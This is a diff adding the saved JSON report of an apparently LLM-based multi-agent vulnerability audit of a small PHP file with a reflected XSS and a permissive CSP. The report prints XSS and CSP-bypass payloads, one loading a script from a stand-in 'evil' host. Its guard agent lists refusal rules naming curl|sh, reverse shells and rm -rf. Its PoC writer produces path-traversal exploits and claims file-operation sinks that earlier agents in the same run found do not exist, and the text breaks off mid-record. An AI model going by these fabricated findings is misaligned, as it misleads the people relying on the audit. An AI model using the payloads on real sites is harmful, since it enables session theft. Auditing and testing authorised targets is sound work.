+        "auto_cve": true,
+        "count": 0
+      },
+      {
+        "type": "rce",
+        "label": "远程代码执行",
+        "cwe": "CWE-94",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "code_injection",
+        "label": "代码注入",
+        "cwe": "CWE-94",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "expression_injection",
+        "label": "表达式注入",
+        "cwe": "CWE-917",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "ldap_injection",
+        "label": "LDAP 注入",
+        "cwe": "CWE-90",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "xpath_injection",
+        "label": "XPath 注入",
+        "cwe": "CWE-643",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "open_redirect",
+        "label": "开放重定向",
+        "cwe": "CWE-601",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "csrf",
+        "label": "跨站请求伪造",
+        "cwe": "CWE-352",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "file_upload",
+        "label": "不安全文件上传",
+        "cwe": "CWE-434",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "race_condition",
+        "label": "竞态条件",
+        "cwe": "CWE-367",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "weak_crypto",
+        "label": "弱加密算法",
+        "cwe": "CWE-327",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "weak_hash",
+        "label": "弱哈希算法",
+        "cwe": "CWE-328",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "weak_random",
+        "label": "弱随机数",
+        "cwe": "CWE-330",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "hardcoded_secret",
+        "label": "硬编码凭据",
+        "cwe": "CWE-798",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "trust_boundary",
+        "label": "信任边界违规",
+        "cwe": "CWE-501",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "log_injection",
+        "label": "日志注入",
+        "cwe": "CWE-117",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "insecure_cookie",
+        "label": "不安全 Cookie",
+        "cwe": "CWE-614",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "information_disclosure",
+        "label": "信息泄露",
+        "cwe": "CWE-200",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "api_info_disclosure",
+        "label": "API 信息泄露",
+        "cwe": "CWE-200",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "captcha_bypass",
+        "label": "验证码绕过",
+        "cwe": "CWE-804",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "csp",
+        "label": "CSP 配置缺陷",
+        "cwe": "CWE-693",
+        "auto_cve": false,
+        "count": 1
+      },
+      {
+        "type": "weak_id",
+        "label": "弱 ID / 可预测会话标识",
+        "cwe": "CWE-330",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "client_side_validation",
+        "label": "客户端校验绕过",
+        "cwe": "CWE-602",
+        "auto_cve": false,
+        "count": 1
+      },
+      {
+        "type": "brute_force",
+        "label": "暴力破解防护缺失",
+        "cwe": "CWE-307",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "second_order_injection",
+        "label": "二次注入",
+        "cwe": "CWE-89",
+        "auto_cve": false,
+        "count": 0
+      },
+      {
+        "type": "prompt_injection",
+        "label": "LLM Prompt 注入",
+        "cwe": "CWE-1426",
+        "auto_cve": false,
+        "count": 0
+      }
+    ]
+  },
+  "policy": {
+    "rule_generation_enabled": true,
+    "min_severity": "low",
+    "min_confidence": 0.6,
+    "raw_candidates": 4,
+    "kept_candidates": 4,
+    "suppressed_count": 0,
+    "suppressed_by_type": {},
+    "suppressed_by_reason": {},
+    "suppressed": [],
+    "note": "落日二号乙不运行确定性规则候选生成；suppressed 仅在外部输入或后续阶段显式产生策略抑制项时使用。"
+  },
+  "llm": {
+    "enabled": true,
+    "mode": "on",
+    "model": "deepseek-chat",
+    "calls": 7,
+    "usage": [
+      {
+        "agent": "safety_guard:injection_signals",
+        "model": "deepseek-chat",
+        "duration_sec": 3.51,
+        "usage": {
+          "prompt_tokens": 1257,
+          "completion_tokens": 264,
+          "total_tokens": 1521,
+          "prompt_tokens_details": {
+            "cached_tokens": 1024
+          },
+          "prompt_cache_hit_tokens": 1024,
+          "prompt_cache_miss_tokens": 233
+        },
+        "ok": true
+      },
+      {
+        "agent": "surface_mapper:scope",
+        "model": "deepseek-chat",
+        "duration_sec": 6.84,
+        "usage": {
+          "prompt_tokens": 1570,
+          "completion_tokens": 976,
+          "total_tokens": 2546,
+          "prompt_tokens_details": {
+            "cached_tokens": 1280
+          },
+          "prompt_cache_hit_tokens": 1280,
+          "prompt_cache_miss_tokens": 290
+        },
+        "ok": true
+      },
+      {
+        "agent": "deep_finder:discovery",
+        "model": "deepseek-chat",
+        "duration_sec": 7.38,
+        "usage": {
+          "prompt_tokens": 5622,
+          "completion_tokens": 1300,
+          "total_tokens": 6922,
+          "prompt_tokens_details": {
+            "cached_tokens": 3840
+          },
+          "prompt_cache_hit_tokens": 3840,
+          "prompt_cache_miss_tokens": 1782
+        },
+        "ok": true
+      },
+      {
+        "agent": "candidate_screener:assessment",
+        "model": "deepseek-chat",
+        "duration_sec": 6.44,
+        "usage": {
+          "prompt_tokens": 3637,
+          "completion_tokens": 1076,
+          "total_tokens": 4713,
+          "prompt_tokens_details": {
+            "cached_tokens": 1536
+          },
+          "prompt_cache_hit_tokens": 1536,
+          "prompt_cache_miss_tokens": 2101
+        },
+        "ok": true
+      },
+      {
+        "agent": "vulnerability_analyzer:finding_deepening",
+        "model": "deepseek-chat",
+        "duration_sec": 16.19,
+        "usage": {
+          "prompt_tokens": 2897,
+          "completion_tokens": 2383,
+          "total_tokens": 5280,
+          "prompt_tokens_details": {
+            "cached_tokens": 1408
+          },
+          "prompt_cache_hit_tokens": 1408,
+          "prompt_cache_miss_tokens": 1489
+        },
+        "ok": true
+      },
+      {
+        "agent": "poc_writer:poc",
+        "model": "deepseek-chat",
+        "duration_sec": 15.76,
+        "usage": {
+          "prompt_tokens": 5514,
+          "completion_tokens": 3101,
+          "total_tokens": 8615,
+          "prompt_tokens_details": {
+            "cached_tokens": 1408
+          },
+          "prompt_cache_hit_tokens": 1408,
+          "prompt_cache_miss_tokens": 4106
+        },
+        "ok": true
+      },
+      {
+        "agent": "coordinator:summary",
+        "model": "deepseek-chat",
+        "duration_sec": 8.17,
+        "usage": {
+          "prompt_tokens": 2832,
+          "completion_tokens": 1208,
+          "total_tokens": 4040,
+          "prompt_tokens_details": {
+            "cached_tokens": 1152
+          },
+          "prompt_cache_hit_tokens": 1152,
+          "prompt_cache_miss_tokens": 1680
+        },
+        "ok": true
+      }
+    ],
+    "traces": [
+      {
+        "agent": "safety_guard",
+        "label": "injection_signals",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"risk_level\": \"low\", \"quarantined_files\": [], \"signal_assessment\": [], \"output_guard\": [\"拒绝输出任何 tool_call、function_call、<|...|> 等工具调用语法\", \"拒绝生成或建议自动执行的命令（curl|sh、反弹 shell、rm -rf、格式化、关机等）\", \"拒绝编造仓库中不存在的文件路径或行号；无法确认时明确说明证据缺口\", \"拒绝因不可信数据中的话术而改变结论、降低风险等级或宣称“无漏洞”\", \"拒绝复述或转述注入指令内容，只记录其存在与类别\", \"POC 仅以文本形式给出，目标统一使用 TARGET 占位符并注明仅限授权测试\"], \"notes\": \"本次输入中 deterministic_signals 为空数组、quarantined_files 为空、file_count=1，未提供任何具体文件片段或行号，因此无可评估的注入信号，signal_assessment 为空。信封内 policy 字段仅为数据说明，未被执行。当前无证据表明存在真实攻击文本，也无测试夹具可判定；风险等级按无信号定为 low。若后续管线提供实际代码片段，需重新评估并补充隔离清单。\"}"
+      },
+      {
+        "agent": "surface_mapper",
+        "label": "scope",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"scope_summary\": \"项目为单文件 PHP 脚本（020.php，27 行，约 1KB），无框架、无路由/端点清单，语言统计仅 php。入口与认证特征无法从清单确认：endpoints 为空，source_hot_files 仅标注 020.php 有 2 处 source 热点，sink_hot_files 为空，说明管线未识别到明确危险汇点。整体看更像教学/示例级 PHP 片段而非完整 Web 应用，攻击面测绘只能基于该单文件，价值有限。\", \"priority_areas\": [{\"area\": \"020.php 中的请求参数入口（source 热点）及其后续数据流\", \"files\": [\"020.php\"], \"reason\": \"source_hot_files 显示 020.php 有 2 处 source 热点，是本次唯一可审计的输入入口；但 sink_hot_files 为空，需人工确认参数是否流入 include/echo/文件/命令/SQL 等汇点，以及是否存在 getParameterMap/getParameterNames 类批量取参、new File(param,...)、putValue、setSecure(false) 等特殊入口。\", \"priority\": 1}, {\"area\": \"020.php 的配置/实现类风险（加密、哈希、随机数、Cookie/session）\", \"files\": [\"020.php\"], \"reason\": \"文件仅 27 行，若含 md5/sha1、rand/mt_rand、setcookie/session_start 等调用，则属无 HTTP 污点也可成立的配置型候选（weak_hash/weak_random/insecure_cookie）；清单未提供代码内容，需人工逐行确认。\", \"priority\": 2}], \"entry_points\": [\"020.php（唯一文件，具体入口函数未在清单中给出；source_hot_files 标注 2 处 source 热点，需人工确认是否为 $_GET/$_POST/$_REQUEST/$_COOKIE 等超全局变量读取）\"], \"risk_notes\": [\"sink_hot_files 为空，不能据此判定无漏洞，只说明管线未匹配到已知危险汇点模式；020.php 的 2 处 source 是否可达汇点仍未确认。\", \"单文件 27 行、无框架、无端点，若为示例代码，实际可利用性取决于部署方式（是否直接暴露于 Web 根目录），当前无法确认。\", \"未发现 getParameterMap()/getParameterNames()/Runtime.exec(args, env)/new File(param,...)/putValue/setSecure(false) 等特殊入口或汇点的证据，但这些模式在 PHP 语境下对应物（如 $_REQUEST 批量取参、extract()、include $_GET、exec/system）需人工在 020.php 内核对。\", \"输入中未出现诱导性文本，无 prompt_injection 证据。\"], \"coverage_gaps\": [\"仅有 1 个 PHP 源文件，无配置文件（php.ini、Web 服务器配置）、无依赖清单（composer.json），无法确认运行环境与安全配置。\", \"endpoints 为空，无法确认 HTTP 路由、认证与授权机制，也无法判断 020.php 是否对外可达。\", \"无 sink 热点与代码片段，无法完成 source→sink 数据流判定；本报告仅为攻击面测绘，不含漏洞结论。\", \"无部署方式、无日志/版本信息，无法评估 CVE 层面的组件风险。\"], \"medium_review_items\": [{\"type\": \"weak_hash\", \"file\": \"020.php\", \"reason\": \"文件短小且为 PHP 脚本，需人工确认是否使用 md5()/sha1()/crc32() 等弱哈希处理口令或令牌（CWE-328）。\"}, {\"type\": \"weak_crypto\", \"file\": \"020.php\", \"reason\": \"需确认是否使用 mcrypt/DES/ECB 模式或 openssl_encrypt 的 ECB/固定 IV 等弱加密实现（CWE-327）。\"}, {\"type\": \"weak_random\", \"file\": \"020.php\", \"reason\": \"需确认是否用 rand()/mt_rand()/uniqid() 生成令牌、验证码或会话标识（CWE-338）。\"}, {\"type\": \"insecure_cookie\", \"file\": \"020.php\", \"reason\": \"需确认 setcookie()/session_set_cookie_params() 是否缺少 HttpOnly/Secure/SameSite 标志，或存在 setSecure(false) 等价写法。\"}, {\"type\": \"trust_boundary\", \"file\": \"020.php\", \"reason\": \"需确认是否直接信任 $_SERVER['HTTP_X_FORWARDED_FOR']、$_SERVER['REMOTE_ADDR'] 或客户端传入的角色/权限参数作为信任边界判断依据。\"}]}"
+      },
+      {
+        "agent": "deep_finder",
+        "label": "discovery",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"summary\": \"本次仅审计 code_pack 中唯一文件 020.php（27 行）。发现 1 条闭合链：POST 参数 include 未编码拼入 <script src> 属性导致反射型 XSS（020.php:13-17），且 CSP 白名单含公共 CDN 无法缓解。其余为攻击面测绘线索：文件未见 md5/sha1、rand/mt_rand、setcookie/session、exec/system、include $_GET 等调用，故 weak_hash/weak_random/insecure_cookie/命令注入等候选无代码证据，不单独立项。endpoints 为空、无配置文件与依赖清单，无法评估路由、认证与组件 CVE；020.php 是否对外可达需人工确认。\", \"coverage\": {\"audited_files\": [\"020.php\"], \"gaps\": [\"无 php.ini/Web 服务器配置，无法确认运行环境与 CSP 实际生效\", \"endpoints 为空，无法确认路由与认证机制\", \"无 composer.json，无法评估依赖组件 CVE\", \"020.php 是否部署于 Web 根目录未确认\"]}, \"findings\": [{\"vulnerability_type\": \"xss\", \"severity\": \"medium\", \"title\": \"020.php 中 POST 参数 include 未编码直接拼入 <script src> 导致反射型 XSS\", \"description\": \"020.php 第 13-17 行读取 $_POST['include']，未做任何 HTML 属性编码或白名单校验，直接拼接进 <script src='...'> 的 src 属性并输出到响应体。攻击者可提交包含单引号闭合属性的 payload（如 `' onerror='alert(1)` 或 `'></script><script>alert(1)</script>`），突破 script 标签属性上下文，注入任意 HTML/JS。虽然页面设置了 CSP（第 3-5 行），但 CSP 的 script-src 白名单包含 unpkg.com、cdn.jsdelivr.net、pastebin.com 等可托管任意 JS 的公共 CDN，攻击者可借助这些域加载自己的脚本，CSP 无法阻止。\", \"file_path\": \"020.php\", \"line_start\": 13, \"line_end\": 17, \"code_snippet\": \"if (isset ($_POST['include'])) {\\n$page[ 'body' ] .= \\\"\\n\\t<script src='\\\" . $_POST['include'] . \\\"'></script>\\n\\\";\\n}\", \"source\": \"POST 参数 include\", \"source_kind\": \"body\", \"source_name\": \"include\", \"tainted_expression\": \"$_POST['include']\", \"sink\": \"字符串拼接后输出到 HTML 响应体（$page['body'] 中的 <script src='...'>）\", \"endpoint\": \"/020.php\", \"http_method\": \"POST\", \"exploit_chain\": [{\"step\": 1, \"location\": \"020.php:13\", \"description\": \"isset($_POST['include']) 判断参数存在\", \"data_state\": \"攻击者完全可控的字符串\"}, {\"step\": 2, \"location\": \"020.php:15\", \"description\": \"将 $_POST['include'] 直接拼接到 <script src='...'> 属性中，无 htmlspecialchars/白名单\", \"data_state\": \"原始未编码字符串进入 HTML 属性上下文\", \"bypass_reason\": \"无任何编码或校验；单引号可闭合 src 属性\"}, {\"step\": 3, \"location\": \"020.php:18\", \"description\": \"$page['body'] 最终输出到响应，浏览器解析执行注入的 HTML/JS\", \"data_state\": \"注入的标签/事件处理器被浏览器执行\"}], \"poc\": {\"description\": \"提交带属性闭合的 include 值，注入 onerror 事件处理器；或借助 CSP 白名单域加载外部脚本\", \"preconditions\": [\"020.php 部署于 Web 根目录且可访问\", \"受害者访问攻击者构造的 POST 请求（或攻击者诱导提交表单）\"], \"steps\": [{\"step\": 1, \"action\": \"发送 POST 请求注入 onerror 事件\", \"request\": \"POST /020.php HTTP/1.1\\nHost: TARGET\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 40\\n\\ninclude=x' onerror='alert(document.domain)\", \"expected_response\": \"响应体包含 <script src='x' onerror='alert(document.domain)'></script>，浏览器加载失败触发 onerror 执行 JS\"}, {\"step\": 2, \"action\": \"或借助 CSP 白名单域加载外部脚本\", \"request\": \"POST /020.php HTTP/1.1\\nHost: TARGET\\nContent-Type: application/x-www-form-urlencoded\\n\\ninclude=https://cdn.jsdelivr.net/gh/attacker/csp_bypass/alert.js\", \"expected_response\": \"响应体包含 <script src='https://cdn.jsdelivr.net/...'></script>，CSP 允许该域，脚本执行\"}], \"payload\": \"x' onerror='alert(document.domain)\"}, \"impact\": \"反射型 XSS，可在受害者浏览器上下文执行任意 JS，窃取会话/发起 CSRF/钓鱼；CSP 因白名单含公共 CDN 而无法有效缓解\", \"cve_justification\": \"CWE-79：外部可达、无需认证，source（$_POST['include']）到 sink（HTML 输出）链路完整闭合，无编码/校验\", \"suggestion\": \"对 include 值使用 htmlspecialchars($v, ENT_QUOTES) 编码；或仅允许 CSP 白名单内的固定域名并做严格 URL 校验；收紧 CSP 移除可托管任意内容的公共 CDN\", \"confidence\": 0.85, \"needs_verification\": true, \"verdict\": \"candidate\", \"verification_notes\": \"需确认 020.php 对外可达及部署方式；CSP 实际生效情况需动态验证\"}]}"
+      },
+      {
+        "agent": "candidate_screener",
+        "label": "assessment",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"assessments\": [{\"candidate_id\": \"GEN-8f1d6361cb1e\", \"keep\": false, \"reason\": \"该候选把 `if (isset($_POST['include'])) {` 这一行本身当作 path_traversal 汇点，但这一行只是存在性判断，既没有 include/require，也没有文件路径拼接或文件读取操作。片段中看不到任何文件系统 sink，source→sink 链不闭合，属于规则误命中（把 isset 判断当成 include 汇点）。\", \"confidence_adjustment\": -0.5, \"missing_evidence\": [\"缺少真正的 include/require/readfile/file_get_contents 等文件操作行\", \"缺少对 $_POST['include'] 是否被用作文件路径的代码\"]}, {\"candidate_id\": \"GEN-dda61ef2bad8\", \"keep\": false, \"reason\": \"该候选把 `$_POST['include']` 拼进 `<script src='...'>` 的 HTML 属性，这是 HTML 输出上下文，不是文件系统路径操作，因此根因不是 path_traversal。同一污点在同一行更准确的归类是 XSS（已由 LLM-370901c0cb4c 覆盖）。按分类门槛，不能因变量名含 include 就改报 path_traversal。\", \"confidence_adjustment\": -0.4, \"missing_evidence\": [\"缺少任何文件路径拼接或文件读取 sink 的证据\"]}, {\"candidate_id\": \"SEM-cc52c467496c\", \"keep\": false, \"reason\": \"该候选仅因出现 `<script src=...>` 标签就命中 client_side_validation，但片段中没有任何客户端校验逻辑（无 JS 校验函数、无表单 onsubmit、无服务端校验缺失的对照）。`<script src>` 只是外部脚本引用，且其值来自服务端拼接，不构成“客户端校验可被绕过”的证据。\", \"confidence_adjustment\": -0.4, \"missing_evidence\": [\"缺少客户端校验代码（JS 校验函数/表单事件）\", \"缺少服务端是否重复校验的对照代码\"]}, {\"candidate_id\": \"SEM-582e93de1b73\", \"keep\": true, \"reason\": \"020.php:3 硬编码 CSP `script-src` 白名单，包含 `'self'` 以及 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等大量第三方源，且注释自述“allows js from various trusted locations”。这是配置型弱点（CSP 策略过宽），不依赖 HTTP 污点，source 为空不代表误报。结合同文件 020.php:15 存在可控 `<script src>` 注入，过宽白名单会削弱 CSP 对脚本加载的约束，证据成立。\", \"confidence_adjustment\": 0.0, \"missing_evidence\": [\"缺少最终响应头实际下发 CSP 的运行时确认（静态已见赋值，未见 header() 调用行）\"]}, {\"candidate_id\": \"LLM-370901c0cb4c\", \"keep\": true, \"reason\": \"链闭合：020.php:13 `isset($_POST['include'])` 读取攻击者完全可控的 POST 参数；020.php:15 直接以字符串拼接写入 `<script src='\\\" . $_POST['include'] . \\\"'></script>`，无 htmlspecialchars/白名单/编码；单引号可闭合 src 属性注入事件处理器或新标签；020.php:18 附近 `$page['body']` 输出到响应体。source→sink 明确，属反射型 XSS。\", \"confidence_adjustment\": 0.05, \"missing_evidence\": [\"缺少 020.php:18 之后 $page['body'] 实际 echo/输出的确切行（片段止于 17 行，输出行未直接展示）\"]}], \"notes\": \"本轮 5 个候选中保留 2 个：SEM-582e93de1b73（CSP 白名单过宽，配置型）与 LLM-370901c0cb4c（020.php:15 反射型 XSS）。GEN-8f1d6361cb1e 与 GEN-dda61ef2bad8 均被误标为 path_traversal：前者把 isset 判断当文件汇点，后者实为 HTML 属性注入（应归 XSS，已由 LLM 候选覆盖），按分类门槛 drop。SEM-cc52c467496c 仅凭 <script src> 标签命中 client_side_validation，无客户端校验代码，drop。policy 显示 suppressed_count=0，无被抑制候选需降档复核。未覆盖范围：code_pack 仅含 020.php 片段，未见 header() 下发 CSP 的调用行及 $page['body'] 最终输出行，相关结论基于已给片段推断（llm_inferred）。\"}"
+      },
+      {
+        "agent": "vulnerability_analyzer",
+        "label": "finding_deepening",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"notes\": \"本次仅能引用 code_pack 中 020.php 第 2-16 行片段，未提供该文件其余部分及任何被包含文件，因此无法确认是否存在后续文件包含/文件读写逻辑；GEN-8f1d6361cb1e 标注的 path_traversal 在给定行号内无文件系统 API，证据不足，已下调置信度。GEN-dda61ef2bad8 的实际数据流终点是 HTML 属性输出，应按输出注入（CWE-79）而非 CWE-22 评估，但按指令未修改 file_path/行号与 finding_id。source 描述中“query include”与源码 `$_POST['include']` 不一致，实际注入点为 POST 参数 include。输入中未发现诱导性 prompt 注入文本。所有 POC 思路仅限授权测试，目标使用 TARGET 占位。\", \"findings\": [{\"finding_id\": \"GEN-8f1d6361cb1e\", \"title\": \"020.php 中 $_POST['include'] 未校验即用于拼接页面内容（CWE-22 路径穿越候选）\", \"description\": \"证据仅覆盖 020.php:11-13：第 13 行 `if (isset ($_POST['include'])) {` 判断 POST 参数 include 是否存在，随后进入第 14-15 行的字符串拼接。候选把 source 记为 query `include`，但源码实际读取的是 `$_POST['include']`（POST 体参数 include），注入点应表述为 POST 参数 include，而非 query 参数。就本片段而言，第 13 行只是存在性判断，本身不构成文件路径操作；真正的危险汇点在第 15 行（见 GEN-dda61ef2bad8）。本候选声称的“路径穿越/任意文件读写”在给定行号范围内没有出现任何文件系统 API（无 include/require、fopen、file_get_contents、readfile、new File 等），因此无法确认路径穿越语义。\", \"impact\": \"证据不足。给定片段内未出现文件读取/写入/包含操作，无法证明可读取或写入任意文件；若后续代码（未在 code_pack 中提供）将 include 值用于文件包含，则可能升级为本地/远程文件包含，但当前证据不支持该结论。\", \"cve_justification\": \"CWE-22 要求外部输入未经规范化即参与文件路径构造。本候选的 source（$_POST['include']）与行号可确认，但 sink 行（020.php:13）仅为 isset 判断，缺少文件路径构造与文件访问调用，利用链不闭合，故不满足 CWE-22 的成立条件。\", \"suggestion\": \"若后续确将 include 值用于文件操作：使用固定白名单映射（如允许的页面名数组）替代直接拼接路径；对输入做 basename() 与 realpath() 规范化并校验结果仍位于允许目录内；禁止将用户输入直接传入 include/require；文件访问使用最小权限账户。\", \"chain_narrative\": \"攻击者向 020.php 提交 POST 参数 include → 第 13 行 isset 判断通过 → 第 14-15 行将值拼入 `$page['body']` 的 `<script src='...'>`。该链路终点是 HTML 属性输出而非文件系统调用，因此本候选标注的 path_traversal 与实际数据流不符，证据不足以支撑路径穿越结论。\", \"confidence\": 0.2, \"evidence_level\": \"llm_inferred\"}, {\"finding_id\": \"GEN-dda61ef2bad8\", \"title\": \"020.php 第 15 行 $_POST['include'] 未编码直接拼入 <script src> 属性（输出注入，非路径穿越）\", \"description\": \"020.php:13-15：`if (isset ($_POST['include'])) { $page['body'] .= \\\"\\\\n\\\\t<script src='\\\" . $_POST['include'] . \\\"'></script>\\\"`。攻击者通过 POST 参数 include 提交任意字符串，该值未经 HTML 属性编码、未做 URL/协议白名单校验，直接拼接进 `<script src='...'>` 的单引号属性中。由于属性使用单引号包裹且未转义，输入中的单引号可闭合属性并注入新的 HTML 标签/属性（例如 `x' onerror='...` 或闭合后追加 `<script>`），属于反射型输出注入（HTML 注入 / 潜在 XSS）。候选将其归类为 path_traversal 不准确：此处不存在文件路径构造或文件访问，数据流终点是 HTML 响应体。\", \"impact\": \"反射型 HTML/脚本注入：攻击者可构造恶意 POST 表单或自动提交页面，使受害者浏览器加载攻击者指定的脚本源或注入内联事件处理器，从而在目标站点源下执行任意 JavaScript，窃取会话 Cookie、发起 CSRF 操作或篡改页面内容。实际可利用性受第 3 行 CSP 限制（见 SEM-582e93de1b73），但 CSP 白名单包含多个第三方 CDN，若攻击者能在其中任一域托管脚本，则可绕过。\", \"cve_justification\": \"CWE-79（跨站脚本）成立条件：外部可控输入（$_POST['include']）未经输出编码进入 HTML 属性上下文，且无需认证即可触发（仅需受害者提交/被诱导提交 POST）。利用链闭合：source=020.php:15 的 $_POST['include']，sink=同行的字符串拼接输出。注意：本候选原始类型标注为 CWE-22，与证据不符，应按输出注入评估。\", \"suggestion\": \"对输出到 HTML 属性的值使用 htmlspecialchars($v, ENT_QUOTES, 'UTF-8')；对 script src 使用 URL 白名单校验（仅允许 https 且域名在固定列表内）；优先改为服务端映射的固定脚本名而非用户可控 URL；收紧 CSP，移除不必要的第三方域并考虑 nonce/hash 机制。\", \"chain_narrative\": \"攻击者构造包含单引号与标签的 POST 请求（include=x' onerror='alert(1) 或 include=x'><script src=//evil></script>）→ 020.php:13 isset 通过 → 020.php:15 直接拼接进 `<script src='...'>` → 响应返回给浏览器 → 属性被闭合，注入的标签/事件处理器执行。全程无文件系统操作，故不是路径穿越。\", \"confidence\": 0.55, \"evidence_level\": \"llm_inferred\"}, {\"finding_id\": \"SEM-582e93de1b73\", \"title\": \"020.php 第 3 行 CSP script-src 白名单过宽（CWE-693 防护机制失效）\", \"description\": \"020.php:3 定义 `$headerCSP = \\\"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;\\\"`。该策略允许从 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等用户可发布内容的第三方站点加载脚本。这些站点允许任意用户上传/托管 JS，因此 CSP 无法有效阻止攻击者注入的 `<script src>` 指向其托管内容，防护形同虚设。此外策略中缺少 object-src 'none'、base-uri 等指令，且未使用 nonce/hash。\", \"impact\": \"CSP 作为 XSS 缓解措施失效：结合 020.php:15 的输出注入，攻击者可将脚本托管在 pastebin/hastebin/unpkg/jsdelivr 等白名单域，使注入的 `<script src>` 通过 CSP 校验并在受害者浏览器执行，导致会话劫持、页面篡改、凭证窃取。\", \"cve_justification\": \"CWE-693（防护机制失效）：CSP 是用于缓解 XSS 的安全控制，但其 script-src 白名单包含可被任意用户写入内容的域，控制未达到设计目的。该缺陷为配置型弱点，无需污点链即可成立；外部可达性由 020.php 的公开 HTTP 端点保证，无需认证。\", \"suggestion\": \"将 script-src 收紧为 'self' 加必要的固定业务域，移除 pastebin/hastebin/unpkg/jsdeli"
+      },
+      {
+        "agent": "poc_writer",
+        "label": "poc",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"pocs\": [{\"finding_id\": \"GEN-8f1d6361cb1e\", \"description\": \"针对 020.php:13 的路径穿越（CWE-22）POC。外部输入经 POST 参数 include 进入文件操作 sink，未做有效规范化/白名单校验，可通过 ../ 序列跳出预期目录。目标地址使用 TARGET 占位符，仅限授权测试。\", \"preconditions\": [\"目标应用已部署，路由 /020 可达且接受 POST\", \"020.php:13 处对 POST 参数 include 直接拼接进文件路径/包含操作，无 basename/realpath 白名单校验（依据源码静态推断，llm_inferred）\", \"已获得明确书面授权，仅对 TARGET 占位符指向的测试实例操作\"], \"steps\": [{\"step\": 1, \"action\": \"基线请求：确认路由可达并记录正常响应作为对比基准\", \"request\": \"POST /020 HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 20\\r\\n\\r\\ninclude=SUNSET_PROBE\", \"expected_response\": \"返回应用正常页面/接口响应（HTTP 200 或业务预期状态码），不出现连接失败\"}, {\"step\": 2, \"action\": \"发送路径穿越载荷，使用 ../ 序列指向预期目录之外的文件\", \"request\": \"POST /020 HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 53\\r\\n\\r\\ninclude=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GEN8f1d6.txt\", \"expected_response\": \"响应中出现目标文件路径或文件内容；若为写操作，TARGET 侧在预期目录之外生成/覆盖 sunset_GEN8f1d6.txt\"}, {\"step\": 3, \"action\": \"状态确认：对比步骤 1 与步骤 2 的响应体、状态码与副作用，确认穿越生效\", \"request\": \"（人工比对两次响应，无需额外请求）\", \"expected_response\": \"步骤 2 响应与基线存在可归因于路径穿越的差异（内容、错误信息泄露绝对路径、或文件副作用）\"}], \"payload\": \"../../../../tmp/sunset_GEN8f1d6.txt\", \"impact\": \"攻击者可读取任意可读文件（配置、凭据）或写入/覆盖任意可写文件，可能导致敏感信息泄露、配置篡改，配合可写目录可进一步升级为代码执行。\", \"cve_justification\": \"符合 CWE-22。漏洞位于 020.php:13，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。\", \"script_notes\": \"POC 仅为文本工件，不执行、不联网。执行前将 TARGET 替换为授权测试实例；建议在隔离环境验证，避免对生产文件系统造成写入副作用。\"}, {\"finding_id\": \"GEN-dda61ef2bad8\", \"description\": \"针对 020.php:15 的路径穿越（CWE-22）POC。POST 参数 include 在第二处文件操作 sink（第 15 行）同样未经规范化校验，可注入 ../ 序列访问预期目录之外的文件。目标地址使用 TARGET 占位符，仅限授权测试。\", \"preconditions\": [\"目标应用已部署，路由 /020 可达且接受 POST\", \"020.php:15 处对 POST 参数 include 直接用于文件路径/包含操作，缺少 basename/realpath 白名单（依据源码静态推断，llm_inferred）\", \"已获得明确书面授权，仅对 TARGET 占位符指向的测试实例操作\"], \"steps\": [{\"step\": 1, \"action\": \"基线请求：确认路由可达并记录正常响应\", \"request\": \"POST /020 HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 20\\r\\n\\r\\ninclude=SUNSET_PROBE\", \"expected_response\": \"返回应用正常页面/接口响应，不出现连接失败\"}, {\"step\": 2, \"action\": \"发送路径穿越载荷至第 15 行 sink\", \"request\": \"POST /020 HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 53\\r\\n\\r\\ninclude=..%2F..%2F..%2F..%2Ftmp%2Fsunset_GENdda61.txt\", \"expected_response\": \"响应中出现目标文件路径或内容；若为写操作，TARGET 侧在预期目录之外生成/覆盖 sunset_GENdda61.txt\"}, {\"step\": 3, \"action\": \"状态确认：对比基线与攻击响应，确认第 15 行 sink 的穿越生效\", \"request\": 